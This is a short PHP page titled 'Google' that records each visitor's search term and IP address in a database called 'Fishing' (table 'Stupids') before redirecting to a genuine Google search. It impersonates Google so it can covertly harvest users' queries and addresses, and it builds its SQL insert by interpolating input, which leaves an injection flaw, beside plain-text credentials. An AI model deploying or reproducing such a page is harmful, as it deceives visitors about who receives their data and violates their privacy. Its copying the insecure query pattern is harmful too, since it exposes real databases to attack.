<!DOCTYPE html>
<html>
	<head>
        <title>Google</title>
    </head>
	<body>
    <?php
    $server = "localhost";
    $username = "php";
    $password = "1.1.";
    $database = "Fishing";
    $search = htmlspecialchars($_POST['search']);
    $ip = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    $conn = mysqli_connect($server, $username, $password, $database);
    $sql = "INSERT INTO Stupids (searched, ip) VALUES ('{$search}', '{$ip}');";
    $result = mysqli_query($conn, $sql);
    mysqli_close($conn);
    header('Location: https://www.google.com/search?q='.$search);
    ?>
    </body>
</html>